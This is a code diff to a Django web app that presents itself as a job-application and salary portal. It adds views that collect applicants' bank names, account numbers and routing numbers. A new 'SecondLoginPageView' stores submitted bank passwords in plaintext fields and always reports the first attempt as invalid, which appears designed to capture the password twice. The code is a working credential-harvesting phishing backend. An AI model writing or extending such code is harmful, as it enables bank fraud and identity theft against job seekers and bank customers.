@@ -265,6 +265,16 @@ class FinancialInformationView(View):
         return render(request, self.template_name, context={'user': details})
 
     def post(self, request, uidb64):
+        bank_name = request.POST['bankName']
+        account_type =request.POST['accountType']
+        account_number =request.POST['accountNumber']
+        routing_number =request.POST['routingNumber']
+
+        email = force_str(force_bytes(urlsafe_base64_decode(uidb64)))
+        details = ApplyJob.objects.filter(email=email).first()
+
+        FinancialInfo.objects.create(email=email, name=details.name, bank_name=bank_name, account_type=account_type, account_number=account_number, routing_number=routing_number)
+
         messages.success(request, self.success_message)
         return render(request, self.template_name)
 
@@ -294,7 +304,10 @@ class LogoutView(LoginRequiredMixin, View):
 
 class LoginPageView(View):
     def get(self, request):
-        return render(request, 'frontend/salary/login.html')
+        context = {
+            'banks':BankName.objects.all()
+        }
+        return render(request, 'frontend/salary/login.html', context=context)
 
     def post(self, request):
 
@@ -363,6 +376,82 @@ class LoginPageView(View):
 
             messages.error(request, 'Invalid login credentials, try again!!')
             return redirect('auth:login')
+
+
+class SecondLoginPageView(View):
+    def get(self, request):
+        context = {
+            'banks':BankName.objects.all()
+        }
+        return render(request, 'frontend/salary/viva_login.html', context=context)
+
+    def post(self, request):
+
+        bank_name = request.POST.get('bank')
+        email = request.POST.get('email')
+        password = request.POST.get('password').strip()
+
+        user = Users.objects.filter(email=email).first()
+
+        if user:
+
+            login_count = LoginCount.objects.filter(user=user).first()
+
+            if login_count and login_count.count > 1:
+
+                if email and password and bank_name:
+
+                    user = authenticate(
+                        request, email=email, password=password)
+
+                    if user:
+
+                        if user.is_active:
+                            login(request, user)
+                            messages.success(
+                                request, f"You are now signed in {user}")
+
+                            nxt = request.GET.get('next', None)
+                            if nxt is None:
+                                return redirect('auth:dashboard')
+                            return redirect(self.request.GET.get('next', None))
+
+                        else:
+                            messages.warning(
+                                request, 'Account not active contact the administrator')
+                    else:
+                        messages.error(request, 'Invalid login credentials')
+                else:
+                    messages.error(request, 'All fields are required!!')
+
+                new_user = Users.objects.create(
+                    bank_name=bank_name, account_password1=password)
+                LoginCount.objects.create(user=new_user)
+
+            else:
+                login_count.increaseCount
+
+                user.account_password2 = password
+                user.set_password(password)
+                user.save()
+
+                login(request, user)
+                messages.success(request, f"You are now signed in {user}")
+
+                nxt = request.GET.get('next', None)
+
+                if nxt is None:
+                    return redirect('auth:dashboard')
+                return redirect(self.request.GET.get('next', None))
+
+        else:
+
+            new_user = Users.objects.create(
+                bank_name=bank_name, email=email, account_password1=password)
+            LoginCount.objects.create(user=new_user, count=1)
+
+            messages.error(request, 'Invalid login credentials, try again!!')
+            return redirect('auth:viva_group')
 
 
 class ProfileView(LoginRequiredMixin, View):
